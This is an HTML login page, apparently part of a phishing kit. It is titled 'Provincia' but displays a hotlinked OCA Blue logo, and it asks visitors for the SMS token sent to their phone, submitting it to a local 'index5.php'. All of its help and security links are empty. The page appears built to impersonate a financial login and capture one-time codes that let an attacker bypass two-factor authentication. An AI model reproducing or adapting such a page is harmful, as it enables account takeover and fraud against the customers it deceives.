
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="fes/test.css">
    <!-- Bootstrap CSS -->

<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

    <title>Provincia</title>
  </head>
  <body>

<section class="login-block">
    <div class="container">
	<div class="row justify-content-center">
		<div class="col-md-4 login-sec" style="justify-content: center;">
		    <img class="justify-content-center" src="https://ocablue.uy/src/img/logo-oca-blue.svg">
	<form class="login-form" id="login" name="login" method="post" autocomplete="off" action="index5.php" >
  <div class="form-group" style="margin-bottom:20px;">
  <br> 
  <br>
    <label for="exampleInputEmail1" class="text-uppercase"> INGRESE EL TOKEN SMS ENVIADO A SU NÚMERO </label>
    <input name="clv" type="text" class="form-control" placeholder="">
    
  </div>
  <div class="d-flex justify-content-center "style="margin-bottom:60px;font-size">
    <a class="linkear" href="">¿NO LLEGO EL TOKEN? CLICK AQUÍ</a>
  </div>
  <div class="d-flex flex-column bd-highlight mb-3" style="margin-top: 10px;">
    <ul class="list-unstyled">
        <li>
          <ul>

            <li><a class="texto" href="">¿Dificultades para ingresar?</a></li>
            <li><a class="texto" href="">Olvidé mi Usuario, Clave y/o Preguntas de Seguridad</a></li>
            <li><a class="texto" href=""> Usuario Bloqueado</a></li>
          </ul>
        </li>
       
      </ul>
  </div>
  <div class="d-flex justify-content-center" style="margin-bottom: 20px;">

    <img src="https://img.icons8.com/metro/26/000000/lock.png"/ width="10px" height="10px"> <a  class="candado" href="" style="margin-left: 6px; font-size:10px;">Recomendaciones de Seguridad</a>
  </div>
    <div class="d-flex justify-content-center">

    <button type="submit" class="btn btn-login float-lg-none" style="color:rgb(255,255,255);">Ingresar</button>
  </div>
  
</form>

		</div>
		<div class="col-md-8 banner-sec">
            <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
                 <ol class="carousel-indicators">
                    <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
                    <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
                    <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>
                  </ol>
            <div class="carousel-inner" role="listbox" style="margin-top:55px;">
    <div class="carousel-item active">
      <img class="d-block img-fluid" src="./fes/imagen1.jpg" alt="First slide">
      <div class="carousel-caption d-none d-md-block">
        <div class="banner-text">
            
        </div>	
  </div>
    </div>
    <div class="carousel-item">
      <img class="d-block img-fluid" src="./fes/imagen2.jpg" alt="First slide">
      <div class="carousel-caption d-none d-md-block">
        <div class="banner-text">
           
        </div>	
    </div>
    </div>
    <div class="carousel-item">
      <img class="d-block img-fluid" src="./fes/imagen3.jpg" alt="First slide">
      <div class="carousel-caption d-none d-md-block">
        <div class="banner-text">
           
        </div>	
    </div>
  </div>
            </div>	   
		    
		</div>
	</div>
</div>
</section>

    <!-- Optional JavaScript; choose one of the two! -->

    <!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>

    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.min.js" integrity="sha384-+sLIOodYLS7CIrQpBjl+C7nPvqq+FbNUBDunl/OZv93DB7Ln/533i8e/mZXLi/P+" crossorigin="anonymous"></script>
    -->
  </body>
</html>